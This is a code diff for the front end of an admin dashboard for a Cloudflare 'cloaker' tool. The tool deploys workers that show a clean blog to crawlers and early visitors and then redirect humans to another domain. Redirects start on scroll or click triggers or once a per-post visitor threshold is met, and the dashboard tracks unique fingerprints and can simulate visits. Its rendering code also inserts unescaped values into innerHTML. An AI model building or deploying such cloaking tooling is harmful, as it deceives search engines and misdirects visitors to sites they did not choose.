+            id="cfgD1Id" 
+            placeholder="7db29aa9-bd12-410d-a982-1600c940a14f" 
+            class="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-slate-900 font-mono text-xs focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 focus:outline-none"
+          />
+        </div>
+      </div>
+
+      <div class="flex items-center justify-between pt-2">
+        <button onclick="testCfConnection(true)" class="px-3 py-1.5 rounded-lg border border-slate-200 text-xs font-semibold text-slate-700 hover:bg-slate-50">
+          Test Connection
+        </button>
+        <div class="flex gap-2">
+          <button onclick="closeSettingsModal()" class="px-3 py-1.5 rounded-lg text-xs font-semibold text-slate-500 hover:text-slate-700">Cancel</button>
+          <button onclick="saveSettings()" class="px-4 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white font-semibold text-xs shadow-sm">Save Changes</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Toast Notification -->
+  <div id="toast" class="fixed bottom-6 right-6 z-50 flex items-center space-x-2 px-4 py-3 rounded-xl bg-slate-900 text-white text-xs font-medium shadow-lg transform translate-y-20 opacity-0 transition-all duration-300">
+    <i id="toastIcon" data-lucide="check-circle" class="w-4 h-4 text-emerald-400"></i>
+    <span id="toastMsg">Action completed</span>
+  </div>
+
+  <!-- Application Script -->
+  <script>
+    let currentMasterMethod = 'trigger'; // 'trigger' (Method 1) OR 'visitor_threshold' (Method 2)
+    let currentTrigger = 'both';         // 'scroll', 'click', or 'both'
+    let currentConfig = {};
+    let currentWorkerCode = '';
+    let currentRobotsTxt = '';
+    let activeTab = 'worker';
+
+    // UI Initializer
+    document.addEventListener('DOMContentLoaded', () => {
+      lucide.createIcons();
+      loadAppConfig();
+      updateWorkerName();
+      generatePreview();
+      loadCampaigns();
+      loadAnalytics();
+
+      // Poll analytics every 3 seconds for active live database synchronization
+      setInterval(loadAnalytics, 3000);
+    });
+
+    // MASTER METHOD SELECTOR: Choose ONE method (Mutually Exclusive)
+    function selectMasterMethod(method) {
+      currentMasterMethod = method;
+
+      const cardTrigger = document.getElementById('masterCardTrigger');
+      const cardThreshold = document.getElementById('masterCardThreshold');
+      const badgeTrigger = document.getElementById('badgeMethodTrigger');
+      const badgeThreshold = document.getElementById('badgeMethodThreshold');
+      const panelTrigger = document.getElementById('panelTriggerOptions');
+      const panelThreshold = document.getElementById('panelThresholdOptions');
+
+      if (method === 'trigger') {
+        // Activate Method 1
+        cardTrigger.className = 'master-card active p-4 rounded-xl border-2 border-emerald-500 bg-emerald-50/30 cursor-pointer relative';
+        badgeTrigger.className = 'px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-100 text-emerald-800 border border-emerald-200 uppercase tracking-wide';
+        badgeTrigger.textContent = 'Active';
+
+        // Deactivate Method 2
+        cardThreshold.className = 'master-card p-4 rounded-xl border-2 border-slate-200 bg-white hover:border-slate-300 cursor-pointer relative';
+        badgeThreshold.className = 'px-2 py-0.5 rounded-full text-[10px] font-bold bg-slate-100 text-slate-500 border border-slate-200 uppercase tracking-wide';
+        badgeThreshold.textContent = 'Inactive';
+
+        panelTrigger.classList.remove('hidden');
+        panelThreshold.classList.add('hidden');
+      } else {
+        // Activate Method 2
+        cardThreshold.className = 'master-card active p-4 rounded-xl border-2 border-indigo-500 bg-indigo-50/30 cursor-pointer relative';
+        badgeThreshold.className = 'px-2 py-0.5 rounded-full text-[10px] font-bold bg-indigo-100 text-indigo-800 border border-indigo-200 uppercase tracking-wide';
+        badgeThreshold.textContent = 'Active';
+
+        // Deactivate Method 1
+        cardTrigger.className = 'master-card p-4 rounded-xl border-2 border-slate-200 bg-white hover:border-slate-300 cursor-pointer relative';
+        badgeTrigger.className = 'px-2 py-0.5 rounded-full text-[10px] font-bold bg-slate-100 text-slate-500 border border-slate-200 uppercase tracking-wide';
+        badgeTrigger.textContent = 'Inactive';
+
+        panelTrigger.classList.add('hidden');
+        panelThreshold.classList.remove('hidden');
+      }
+
+      generatePreview();
+    }
+
+    // Trigger Mode Sub-Selector (for Method 1)
+    function selectTrigger(mode) {
+      currentTrigger = mode;
+      
+      const cardBoth = document.getElementById('cardTriggerBoth');
+      const cardScroll = document.getElementById('cardTriggerScroll');
+      const cardClick = document.getElementById('cardTriggerClick');
+      const scrollContainer = document.getElementById('scrollContainer');
+
+      [cardBoth, cardScroll, cardClick].forEach(c => {
+        c.classList.remove('active', 'border-emerald-500');
+        c.classList.add('border-slate-200');
+      });
+
+      if (mode === 'both') {
+        cardBoth.classList.add('active', 'border-emerald-500');
+        cardBoth.classList.remove('border-slate-200');
+        scrollContainer.style.display = 'block';
+      } else if (mode === 'scroll') {
+        cardScroll.classList.add('active', 'border-emerald-500');
+        cardScroll.classList.remove('border-slate-200');
+        scrollContainer.style.display = 'block';
+      } else if (mode === 'click') {
+        cardClick.classList.add('active', 'border-emerald-500');
+        cardClick.classList.remove('border-slate-200');
+        scrollContainer.style.display = 'none';
+      }
+
+      generatePreview();
+    }
+
+    function setScrollVal(val) {
+      document.getElementById('scrollRange').value = val;
+      updateScrollVal(val);
+      generatePreview();
+    }
+
+    function updateScrollVal(val) {
+      document.getElementById('scrollValue').textContent = `${val}% Scroll`;
+    }
+
+    function showToast(msg, isError = false) {
+      const toast = document.getElementById('toast');
+      const toastMsg = document.getElementById('toastMsg');
+      const toastIcon = document.getElementById('toastIcon');
+      
+      toastMsg.textContent = msg;
+      toastIcon.setAttribute('data-lucide', isError ? 'alert-triangle' : 'check-circle');
+      toastIcon.className = `w-4 h-4 ${isError ? 'text-rose-400' : 'text-emerald-400'}`;
+      lucide.createIcons();
+
+      toast.classList.remove('translate-y-20', 'opacity-0');
+      setTimeout(() => {
+        toast.classList.add('translate-y-20', 'opacity-0');
+      }, 3000);
+    }
+
+    function updateThresholdExplainer() {
+      const val = parseInt(document.getElementById('thresholdCount').value, 10) || 50;
+      const p = document.getElementById('thresholdExplainer');
+      if (p) {
+        p.textContent = `Visits 1 to ${Math.max(val - 1, 1)} see clean blog post. Redirection activates from visitor #${val} onward.`;
+      }
+    }
+
+    async function loadAppConfig() {
+      try {
+        const res = await fetch('/api/config');
+        currentConfig = await res.json();
+        
+        document.getElementById('cfgApiToken').value = currentConfig.apiToken || '';
+        document.getElementById('cfgAccountId').value = currentConfig.accountId || '';
+        document.getElementById('cfgD1Id').value = currentConfig.d1DatabaseId || '';
+
+        if (currentConfig.thresholdCount) {
+          document.getElementById('thresholdCount').value = currentConfig.thresholdCount;
+          updateThresholdExplainer();
+        }
+
+        if (currentConfig.activationMethod) {
+          selectMasterMethod(currentConfig.activationMethod);
+        }
+
+        if (currentConfig.defaultTrigger) {
+          selectTrigger(currentConfig.defaultTrigger);
+        }
+
+        if (currentConfig.apiToken) {
+          // Small delay so the page renders first, then verify
+          setTimeout(() => testCfConnection(false), 300);
+        } else {
+          // No token — show not configured state
+          const dot = document.getElementById('cf-dot');
+          const txt = document.getElementById('cf-status-text');
+          const pill = document.getElementById('cf-status-pill');
+          dot.className = 'w-2 h-2 rounded-full bg-slate-400';
+          txt.textContent = 'Not configured';
+          pill.className = 'flex items-center space-x-2 px-3 py-1.5 rounded-full bg-slate-100 border border-slate-200 text-xs font-medium text-slate-600';
+        }
+      } catch (e) {
+        console.error(e);
+      }
+    }
+
+    async function testCfConnection(showSuccessToast = true) {
+      const pill = document.getElementById('cf-status-pill');
+      const dot = document.getElementById('cf-dot');
+      const txt = document.getElementById('cf-status-text');
+
+      // Prevent concurrent automatic verify calls (allow manual clicks)
+      if (txt.textContent === 'Verifying...' && !showSuccessToast) return;
+
+      txt.textContent = 'Verifying...';
+      dot.className = 'w-2 h-2 rounded-full bg-amber-400 animate-pulse';
+      pill.className = 'cursor-pointer flex items-center space-x-2 px-3 py-1.5 rounded-full bg-slate-100 border border-slate-200 text-xs font-medium text-slate-700';
+
+      const token = document.getElementById('cfgApiToken')?.value || currentConfig.apiToken;
+      const accountId = document.getElementById('cfgAccountId')?.value || currentConfig.accountId;
+
+      // Timeout wrapper: 10s
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 10000);
+
+      try {
+        const res = await fetch('/api/verify-cf', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ apiToken: token, accountId: accountId, forceRefresh: !!showSuccessToast }),
+          signal: controller.signal
+        });
+        clearTimeout(timeout);
+        const data = await res.json();
+
+        if (data.success) {
+          dot.className = 'w-2 h-2 rounded-full bg-emerald-500';
+          txt.textContent = `Connected (${data.account?.name || 'Account'} • ${data.zonesCount} Zones)`;
+          pill.className = 'cursor-pointer flex items-center space-x-2 px-3 py-1.5 rounded-full bg-emerald-50 border border-emerald-200 text-xs font-semibold text-emerald-800';
+          if (data.freshToken) {
+            currentConfig.apiToken = data.freshToken;
+            const tokenInput = document.getElementById('cfgApiToken');
+            if (tokenInput) tokenInput.value = data.freshToken;
+          }
+          if (showSuccessToast) showToast('Cloudflare connection verified!');
+          fetchCloudflareZones();
+        } else {
+          dot.className = 'w-2 h-2 rounded-full bg-rose-500';
+          txt.textContent = data.message ? `Connection Failed: ${data.message}` : 'Connection Failed';
+          pill.className = 'cursor-pointer flex items-center space-x-2 px-3 py-1.5 rounded-full bg-rose-50 border border-rose-200 text-xs font-semibold text-rose-800';
+          if (showSuccessToast) showToast(data.message, true);
+        }
+      } catch (err) {
+        clearTimeout(timeout);
+        dot.className = 'w-2 h-2 rounded-full bg-rose-500';
+        txt.textContent = 'Connection Error';
+        pill.className = 'cursor-pointer flex items-center space-x-2 px-3 py-1.5 rounded-full bg-rose-50 border border-rose-200 text-xs font-semibold text-rose-800';
+        if (showSuccessToast) showToast(err.message, true);
+      }
+    }
+
+    async function fetchCloudflareZones() {
+      try {
+        const res = await fetch('/api/zones');
+        const data = await res.json();
+        const select = document.getElementById('zoneSelect');
+        if (data.success && data.zones && data.zones.length > 0) {
+          select.innerHTML = '<option value="">Choose Cloudflare Zone...</option>';
+          data.zones.forEach(z => {
+            select.innerHTML += `<option value="${z.name}">${z.name}</option>`;
+          });
+          select.classList.remove('hidden');
+        }
+      } catch(e) {}
+    }
+
+    function selectZone(zoneName) {
+      if (!zoneName) return;
+      document.getElementById('sourceDomain').value = zoneName;
+      updateWorkerName();
+      generatePreview();
+    }
+
+    function updateWorkerName() {
+      const src = document.getElementById('sourceDomain').value.trim().toLowerCase();
+      const cleanDomain = src.replace(/^https?:\/\//i, '').replace(/\/+$/, '');
+      const cleanName = cleanDomain.replace(/[^a-z0-9]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '');
+      document.getElementById('workerName').value = cleanName ? `${cleanName}-cloaker` : 'custom-cloaker';
+      
+      document.getElementById('preview-routes').textContent = (cleanDomain ? cleanDomain : 'domain.com') + '/*';
+      document.getElementById('preview-routes-www').textContent = 'www.' + (cleanDomain ? cleanDomain : 'domain.com') + '/*';
+    }
+
+    async function generatePreview() {
+      const src = document.getElementById('sourceDomain').value.trim();
+      const tgt = document.getElementById('targetDomain').value.trim();
+      const pct = parseInt(document.getElementById('scrollRange').value, 10);
+      const sitemaps = document.getElementById('sitemapList').value.split(',').map(s => s.trim()).filter(Boolean);
+      const blockThemes = document.getElementById('chkTheme').checked;
+      const thresholdCount = parseInt(document.getElementById('thresholdCount').value, 10) || 50;
+
+      if (!src || !tgt) return;
+
+      try {
+        const res = await fetch('/api/generate', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            sourceDomain: src,
+            targetDomain: tgt,
+            activationMethod: currentMasterMethod,
+            scrollPct: pct,
+            triggerCondition: currentTrigger,
+            thresholdCount,
+            sitemaps,
+            blockThemes
+          })
+        });
+        const data = await res.json();
+        if (data.success) {
+          currentWorkerCode = data.workerCode;
+          currentRobotsTxt = data.robotsTxt;
+          document.getElementById('codePreview').textContent = data.workerCode;
+          document.getElementById('robotsPreview').textContent = data.robotsTxt;
+        }
+      } catch (e) {
+        console.error(e);
+      }
+    }
+
+    function switchTab(tab) {
+      activeTab = tab;
+      const btnW = document.getElementById('tabBtnWorker');
+      const btnR = document.getElementById('tabBtnRobots');
+      const tabW = document.getElementById('tabWorker');
+      const tabR = document.getElementById('tabRobots');
+
+      if (tab === 'worker') {
+        btnW.className = 'px-3 py-1 text-xs font-bold rounded-lg bg-emerald-100 text-emerald-800 border border-emerald-200 transition';
+        btnR.className = 'px-3 py-1 text-xs font-bold rounded-lg text-slate-600 hover:text-slate-900 hover:bg-slate-100 transition';
+        tabW.classList.remove('hidden');
+        tabR.classList.add('hidden');
+      } else {
+        btnR.className = 'px-3 py-1 text-xs font-bold rounded-lg bg-emerald-100 text-emerald-800 border border-emerald-200 transition';
+        btnW.className = 'px-3 py-1 text-xs font-bold rounded-lg text-slate-600 hover:text-slate-900 hover:bg-slate-100 transition';
+        tabR.classList.remove('hidden');
+        tabW.classList.add('hidden');
+      }
+    }
+
+    function copyActiveCode() {
+      const text = activeTab === 'worker' ? currentWorkerCode : currentRobotsTxt;
+      if (!text) return;
+      navigator.clipboard.writeText(text);
+      const span = document.getElementById('copyBtnText');
+      span.textContent = 'Copied!';
+      showToast('Copied to clipboard!');
+      setTimeout(() => span.textContent = 'Copy', 2000);
+    }
+
+    // Modal controls
+    function openSettingsModal() {
+      document.getElementById('settingsModal').classList.remove('hidden');
+    }
+    function closeSettingsModal() {
+      document.getElementById('settingsModal').classList.add('hidden');
+    }
+    async function saveSettings() {
+      const apiToken = document.getElementById('cfgApiToken').value.trim();
+      const accountId = document.getElementById('cfgAccountId').value.trim();
+      const d1DatabaseId = document.getElementById('cfgD1Id').value.trim();
+      const thresholdCount = parseInt(document.getElementById('thresholdCount').value, 10) || 50;
+      
+      const res = await fetch('/api/config', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          apiToken,
+          accountId,
+          d1DatabaseId,
+          activationMethod: currentMasterMethod,
+          defaultTrigger: currentTrigger,
+          thresholdCount
+        })
+      });
+      const data = await res.json();
+      if (data.success) {
+        currentConfig = data.config;
+        showToast('Settings saved successfully!');
+        testCfConnection(false);
+        closeSettingsModal();
+      }
+    }
+
+    // 1-Click Deployment Engine using the ONE selected method
+    async function startDeployment() {
+      const src = document.getElementById('sourceDomain').value.trim();
+      const tgt = document.getElementById('targetDomain').value.trim();
+      const workerName = document.getElementById('workerName').value.trim();
+      const scrollPct = parseInt(document.getElementById('scrollRange').value, 10);
+      const sitemaps = document.getElementById('sitemapList').value.split(',').map(s => s.trim()).filter(Boolean);
+      const thresholdCount = parseInt(document.getElementById('thresholdCount').value, 10) || 50;
+
+      if (!src || !tgt) {
+        showToast('Please specify Source and Target domains.', true);
+        return;
+      }
+
+      const btn = document.getElementById('btnDeploy');
+      const badge = document.getElementById('deployBadge');
+      const terminal = document.getElementById('terminalConsole');
+
+      btn.disabled = true;
+      btn.innerHTML = `<i data-lucide="loader" class="w-5 h-5 animate-spin"></i><span>Deploying to Cloudflare...</span>`;
+      badge.textContent = 'Deploying...';
+      badge.className = 'text-[10px] font-mono px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/30';
+      lucide.createIcons();
+
+      const methodLabel = currentMasterMethod === 'visitor_threshold' ? 
+        `Unique Human Visitor (${thresholdCount}/24h)` : 
+        `Human Verification Trigger (${currentTrigger.toUpperCase()})`;
+
+      terminal.innerHTML = `<div class="text-emerald-400 font-bold">> Starting Deployment for ${src} using ONE Method: [${methodLabel}]...</div>`;
+
+      try {
+        const res = await fetch('/api/deploy', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            sourceDomain: src,
+            targetDomain: tgt,
+            workerName,
+            activationMethod: currentMasterMethod,
+            scrollPct,
+            triggerCondition: currentTrigger,
+            thresholdCount,
+            sitemaps,
+            includeWww: document.getElementById('chkIncludeWww').checked
+          })
+        });
+        const data = await res.json();
+
+        if (data.logs && data.logs.length > 0) {
+          data.logs.forEach(l => {
+            const colorClass = l.type === 'error' ? 'text-rose-400 font-bold' : 
+                               l.type === 'success' ? 'text-emerald-400 font-bold' : 
+                               l.type === 'step' ? 'text-sky-300 font-semibold' : 'text-slate-300';
+            terminal.innerHTML += `<div class="${colorClass}">[${l.time}] ${l.message}</div>`;
+          });
+        }
+
+        terminal.scrollTop = terminal.scrollHeight;
+
+        if (data.success) {
+          badge.textContent = '100% Active';
+          badge.className = 'text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/30';
+          showToast(`Successfully deployed ${methodLabel}!`);
+          loadCampaigns();
+          loadAnalytics();
+        } else {
+          badge.textContent = 'Deploy Failed';
+          badge.className = 'text-[10px] font-mono px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/30';
+          showToast(data.message || 'Deployment error', true);
+        }
+      } catch (err) {
+        terminal.innerHTML += `<div class="text-rose-400 font-bold">[!] Network / Server Error: ${err.message}</div>`;
+        showToast(err.message, true);
+      } finally {
+        btn.disabled = false;
+        btn.innerHTML = `<i data-lucide="cloud-lightning" class="w-5 h-5"></i><span>Deploy 1-Click to Cloudflare</span>`;
+        lucide.createIcons();
+      }
+    }
+
+    // Active Campaigns Manager
+    async function loadCampaigns() {
+      const container = document.getElementById('campaignsContainer');
+      try {
+        const res = await fetch('/api/campaigns');
+        const data = await res.json();
+        
+        if (!data.success || !data.campaigns || data.campaigns.length === 0) {
+          container.innerHTML = `<div class="p-4 rounded-xl bg-slate-50 border border-slate-200 text-center text-xs text-slate-500">No active campaigns deployed yet.</div>`;
+          return;
+        }
+
+        container.innerHTML = '';
+        data.campaigns.forEach(c => {
+          const isThreshold = c.activationMethod === 'visitor_threshold';
+          const methodBadge = isThreshold ?
+            `<span class="px-2 py-0.5 rounded-full text-[10px] font-bold bg-indigo-100 text-indigo-800 border border-indigo-200">Method 2: 24h Gate (${c.thresholdCount || 50}/24h)</span>` :
+            `<span class="px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-100 text-emerald-800 border border-emerald-200">Method 1: Trigger (${(c.triggerCondition || 'both').toUpperCase()})</span>`;
+
+          container.innerHTML += `
+            <div class="p-3.5 rounded-xl border border-slate-200 hover:border-slate-300 bg-white hover:bg-slate-50/50 transition flex items-center justify-between gap-3">
+              <div class="space-y-1 min-w-0">
+                <div class="flex items-center gap-1.5 flex-wrap">
+                  <span class="font-bold text-xs text-slate-900 truncate">${c.sourceDomain}</span>
+                  ${methodBadge}
+                </div>
+                <div class="text-[11px] text-slate-500 truncate flex items-center gap-1">
+                  <i data-lucide="arrow-right" class="w-3 h-3 text-slate-400"></i>
+                  <span>${c.targetDomain}</span>
+                </div>
+              </div>
+              <div class="flex items-center gap-2 shrink-0">
+                <a href="https://${c.sourceDomain}" target="_blank" class="px-2.5 py-1 text-xs font-semibold rounded-lg bg-slate-100 hover:bg-slate-200 text-slate-700 transition flex items-center gap-1">
+                  <span>Test</span>
+                  <i data-lucide="external-link" class="w-3 h-3 text-slate-400"></i>
+                </a>
+                <button onclick="redeployCampaign('${c.sourceDomain}', '${c.targetDomain}', '${c.activationMethod || 'trigger'}', '${c.scrollPct}', '${c.triggerCondition || 'both'}', ${c.thresholdCount || 50})" class="px-2.5 py-1 text-xs font-semibold rounded-lg bg-emerald-50 hover:bg-emerald-100 border border-emerald-200 text-emerald-700 transition">
+                  Re-deploy
+                </button>
+              </div>
+            </div>
+          `;
+        });
+        lucide.createIcons();
+      } catch (e) {
+        console.error(e);
+      }
+    }
+
+    function redeployCampaign(src, tgt, method, pct, triggerMode, threshold) {
+      document.getElementById('sourceDomain').value = src;
+      document.getElementById('targetDomain').value = tgt;
+      setScrollVal(pct || 15);
+      selectTrigger(triggerMode || 'both');
+      selectMasterMethod(method || 'trigger');
+      if (threshold) document.getElementById('thresholdCount').value = threshold;
+      updateWorkerName();
+      generatePreview();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      showToast(`Loaded campaign for ${src}. Click Deploy when ready.`);
+    }
+
+    async function manualSyncStats() {
+      const icon = document.getElementById('syncIcon');
+      if (icon) icon.classList.add('animate-spin');
+      await loadAnalytics();
+      showToast('Live D1 Database Synced!');
+      setTimeout(() => {
+        if (icon) icon.classList.remove('animate-spin');
+      }, 500);
+    }
+
+    // Real-Time Analytics Engine
+    async function loadAnalytics() {
+      try {
+        const thresholdInput = document.getElementById('thresholdCount');
+        const userThreshold = thresholdInput ? parseInt(thresholdInput.value, 10) : null;
+        const url = userThreshold ? `/api/analytics/posts?threshold=${userThreshold}` : '/api/analytics/posts';
+        const res = await fetch(url);
+        const data = await res.json();
+
+        if (!data.success) return;
+
+        const { stats, posts, threshold } = data;
+
+        document.getElementById('statTotalHumans').textContent = stats.totalHumans24h || 0;
+        document.getElementById('statActivePosts').textContent = stats.activePostsCount || 0;
+        document.getElementById('statHoldingPosts').textContent = stats.holdingPostsCount || 0;
+
+        const sub = document.getElementById('statTotalVisitsSub');
+        if (sub) {
+          sub.textContent = `${stats.totalVisits24h || 0} total hits (${stats.totalHumans24h || 0} unique humans)`;
+        }
+        const syncTime = document.getElementById('syncTimestamp');
+        if (syncTime) {
+          syncTime.textContent = 'Synced: ' + new Date().toLocaleTimeString();
+        }
+
+        // Update KPI threshold labels dynamically
+        const kpiActive = document.getElementById('kpiActiveThreshold');
+        const kpiHolding = document.getElementById('kpiHoldingThreshold');
+        if (kpiActive) kpiActive.textContent = threshold;
+        if (kpiHolding) kpiHolding.textContent = threshold;
+
+        const tbody = document.getElementById('analyticsTableBody');
+        if (!posts || posts.length === 0) {
+          tbody.innerHTML = `
+            <tr>
+              <td colspan="6" class="px-4 py-8 text-center text-slate-500">
+                <div class="flex flex-col items-center justify-center space-y-2">
+                  <i data-lucide="inbox" class="w-6 h-6 text-slate-400"></i>
+                  <span>No human visits recorded in the last 24 hours yet.</span>
+                  <button onclick="simulateTraffic(1)" class="text-xs text-indigo-600 font-semibold hover:underline">
+                    + Simulate 1 human visit to test
+                  </button>
+                </div>
+              </td>
+            </tr>
+          `;
+          lucide.createIcons();
+          return;
+        }
+
+        tbody.innerHTML = '';
+        posts.forEach(p => {
+          const count = p.human_visits !== undefined ? p.human_visits : (p.total_visits || p.unique_humans);
+          const distinctIPs = p.unique_humans || count;
+          const pct = Math.min(Math.round((count / threshold) * 100), 100);
+          const isActive = count >= threshold;
+
+          const statusBadge = isActive ?
+            `<span class="px-2.5 py-1 rounded-full text-[11px] font-bold bg-emerald-100 text-emerald-800 border border-emerald-200 flex items-center gap-1 w-max">
+               <i data-lucide="zap" class="w-3 h-3 text-emerald-600"></i>
+               <span>Active (Redirecting)</span>
+             </span>` :
+            `<span class="px-2.5 py-1 rounded-full text-[11px] font-semibold bg-amber-100 text-amber-800 border border-amber-200 flex items-center gap-1 w-max">
+               <i data-lucide="shield" class="w-3 h-3 text-amber-600"></i>
+               <span>Holding (Clean Blog)</span>
+             </span>`;
+
+          const progressBarColor = isActive ? 'bg-emerald-500' : 'bg-indigo-500';
+
+          tbody.innerHTML += `
+            <tr class="hover:bg-slate-50/70 transition">
+              <td class="px-4 py-3 font-mono font-medium text-slate-900">${p.post_path}</td>
+              <td class="px-4 py-3 font-bold text-slate-900">
+                <span class="text-sm font-extrabold text-slate-900">${count}</span> <span class="text-slate-400 font-normal">/ ${threshold}</span>
+                <span class="text-[10px] text-slate-400 font-normal block font-sans">(${distinctIPs} unique fingerprints)</span>
+              </td>
+              <td class="px-4 py-3 w-44">
+                <div class="space-y-1">
+                  <div class="flex items-center justify-between text-[10px] text-slate-500">
+                    <span>${pct}% to redirect</span>
+                  </div>
+                  <div class="w-full bg-slate-200 rounded-full h-1.5 overflow-hidden">
+                    <div class="${progressBarColor} h-1.5 rounded-full transition-all duration-500" style="width: ${pct}%"></div>
+                  </div>
+                </div>
+              </td>
+              <td class="px-4 py-3">${statusBadge}</td>
+              <td class="px-4 py-3 text-slate-500 text-[11px]">${p.last_visit ? p.last_visit : 'Just now'}</td>
+              <td class="px-4 py-3 text-right">
+                <div class="flex items-center justify-end gap-1.5">
+                  <button onclick="simulateTraffic(1, '${p.post_path}')" class="px-2 py-1 rounded bg-slate-100 hover:bg-slate-200 text-slate-700 text-[10px] font-semibold transition" title="Add 1 Human Visit">
+                    +1 Visit
+                  </button>
+                  <a href="https://${document.getElementById('sourceDomain').value}${p.post_path}" target="_blank" class="px-2 py-1 rounded bg-indigo-50 hover:bg-indigo-100 text-indigo-700 text-[10px] font-semibold transition flex items-center gap-1">
+                    <span>Open</span>
+                    <i data-lucide="external-link" class="w-2.5 h-2.5"></i>
+                  </a>
+                </div>
+              </td>
+            </tr>
+          `;
+        });
+        lucide.createIcons();
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    async function simulateTraffic(count = 1, postPath) {
+      const path = postPath || '/50-driveway-landscaping-ideas/';
+      showToast(`Simulating ${count} human visit(s) to ${path}...`);
+      try {
+        const res = await fetch('/api/analytics/simulate', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ postPath: path, count })
+        });
+        const data = await res.json();
+        if (data.success) {
+          showToast(`Recorded ${count} human visits!`);
+          loadAnalytics();
+        } else {
+          showToast(data.message || 'Simulation error', true);
+        }
+      } catch (e) {
+        showToast(e.message, true);
+      }
+    }
+
+    async function resetAnalyticsData() {
+      if (!confirm('Are you sure you want to reset all 24-hour visitor analytics?')) return;
+      try {
+        const res = await fetch('/api/analytics/reset', { method: 'POST' });
+        const data = await res.json();
+        if (data.success) {
+          showToast('Analytics reset successfully');
+          loadAnalytics();
+        }
+      } catch (e) {
+        showToast(e.message, true);
+      }
+    }
+  </script>
+</body>
+</html>
